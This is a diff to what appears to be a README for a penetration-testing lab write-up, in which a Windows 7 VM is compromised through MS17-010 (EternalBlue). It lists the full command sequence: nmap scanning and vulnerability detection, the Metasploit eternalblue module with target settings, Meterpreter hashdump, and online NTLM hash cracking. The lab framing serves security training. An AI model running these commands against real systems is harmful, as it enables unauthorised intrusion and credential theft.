@@ -1,11 +1,11 @@
 Hands-on penetration testing lab exploiting MS17-010 (EternalBlue) on a vulnerable Windows 7 system to achieve SYSTEM-level access and demonstrate post-exploitation risks.
 
-📌 Project Summary
+##📌 Project Summary
 
 This project demonstrates a full compromise of a Windows 7 vulnerable virtual machine (Blue) by exploiting the critical MS17-010 (EternalBlue) vulnerability.
 The assessment covers reconnaissance, exploitation, and post-exploitation in a controlled lab environment.
 
-🧪 Lab Environment
+##🧪 Lab Environment
 
 Target: Windows 7 (Blue – Vulnerable VM)
 
@@ -16,27 +16,36 @@ Target IP: 192.168.1.32
 Tools: Nmap, Metasploit, Meterpreter, CrackStation
 
 🔍 Attack Workflow
+
 🔎 Reconnaissance
+```bash
 nmap -sC -sV -p 445 192.168.1.32
-
-🧨 Vulnerability Detection
+```
+##🧨 Vulnerability Detection
+```bash
 nmap --script smb-vuln-ms17-010 -p 445 192.168.1.32
+```
 
-💥 Exploitation (EternalBlue)
+##💥 Exploitation (EternalBlue)
+```bash
 msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.1.32
 set LHOST <Your_IP>
 exploit
+```
 
 🔓 Post-Exploitation
+```bash
 sysinfo
 hashdump
+```
 
 
-Extracted NTLM hashes
-
+##Extracted NTLM hashes
 Cracked credentials to demonstrate credential compromise risk
+# Crack NTLM hashes
+https://crackstation.net/
 
 ✅ Results
 
